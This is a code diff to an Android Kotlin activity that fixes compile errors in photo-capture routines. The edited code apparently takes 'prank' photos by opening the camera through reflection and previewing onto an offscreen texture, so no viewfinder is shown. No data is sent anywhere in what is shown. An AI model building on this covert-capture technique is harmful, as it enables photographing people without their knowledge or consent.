@@ -165,6 +165,7 @@ class MainActivity : AppCompatActivity() {
             val latch = CountDownLatch(1)
             val cacheDir = cacheDir
             val photoFile = File(cacheDir, "prank_photo_${System.currentTimeMillis()}.jpg")
+            val handler = Handler(Looper.getMainLooper())
             
             runOnUiThread {
                 try {
@@ -179,19 +180,19 @@ class MainActivity : AppCompatActivity() {
                     startActivityForResult(intent, 100)
                     
                     // Ждём пока файл появится
-                    object : Handler(Looper.getMainLooper()) {
-                        fun check() {
+                    handler.postDelayed(object : Runnable {
+                        override fun run() {
                             if (photoFile.exists() && photoFile.length() > 0) {
                                 photoRef.data = photoFile.readBytes()
                                 latch.countDown()
                             } else {
-                                postDelayed({ check() }, 200)
+                                handler.postDelayed(this, 200)
                             }
                         }
-                    }.postDelayed({ check() }, 1000)
+                    }, 1000)
                     
                     // Таймаут 10 секунд
-                    postDelayed({ latch.countDown() }, 10000)
+                    handler.postDelayed({ latch.countDown() }, 10000)
                 } catch (e: Exception) {
                     latch.countDown()
                 }
@@ -213,41 +214,47 @@ class MainActivity : AppCompatActivity() {
             val cameraClass = Class.forName("android.hardware.Camera")
             val openMethod = cameraClass.getMethod("open")
             val camera = openMethod.invoke(null)
-            
+
             if (camera != null) {
                 val parameters = cameraClass.getMethod("getParameters").invoke(camera)
-                val sizes = parameters?.let { 
-                    it::class.java.getMethod("getSupportedPictureSizes").invoke(it) 
+                val sizes = parameters?.let {
+                    it::class.java.getMethod("getSupportedPictureSizes").invoke(it)
                 } as? List<*>
-                
+
                 if (!sizes.isNullOrEmpty()) {
                     val size = sizes[0]
                     val width = size::class.java.getField("width").get(size) as Int
                     val height = size::class.java.getField("height").get(size) as Int
-                    
-                    parameters::class.java.getMethod("setPictureSize", Int::class.java, Int::class.java)
+
+                    parameters::class.java.getMethod("setPictureSize", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType)
                         .invoke(parameters, width, height)
                     cameraClass.getMethod("setParameters", parameters::class.java)
                         .invoke(camera, parameters)
-                    
+
                     val texture = SurfaceTexture(10)
                     cameraClass.getMethod("setPreviewTexture", SurfaceTexture::class.java)
                         .invoke(camera, texture)
                     cameraClass.getMethod("startPreview").invoke(camera)
                     Thread.sleep(500)
-                    
+
                     val photoRef = ByteArrayRef()
-                    cameraClass.getMethod("takePicture", 
-                        Class.forName("android.hardware.Camera\$ShutterCallback"),
-                        Class.forName("android.hardware.Camera\$PictureCallback"),
-                        Class.forName("android.hardware.Camera\$PictureCallback"),
-                        Class.forName("android.hardware.Camera\$PictureCallback")
-                    ).invoke(camera, null, null, null, { data, _ ->
-                        if (data != null) {
-                            photoRef.data = data
-                        }
-                    } as HardwareCamera.PictureCallback)
+                    val shutterCallbackClass = Class.forName("android.hardware.Camera\$ShutterCallback")
+                    val pictureCallbackClass = Class.forName("android.hardware.Camera\$PictureCallback")
                     
+                    cameraClass.getMethod("takePicture",
+                        shutterCallbackClass,
+                        pictureCallbackClass,
+                        pictureCallbackClass,
+                        pictureCallbackClass
+                    ).invoke(camera, null, null, null, object : HardwareCamera.PictureCallback {
+                        override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
+                            if (data != null) {
+                                photoRef.data = data
+                            }
+                            camera?.release()
+                        }
+                    })
+
                     Thread.sleep(1000)
                     cameraClass.getMethod("release").invoke(camera)
                     photoRef.data
@@ -261,7 +268,7 @@ class MainActivity : AppCompatActivity() {
             null
         }
     }
-    
+
     private fun tryCamera2Api(): ByteArray? {
         try {
             val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
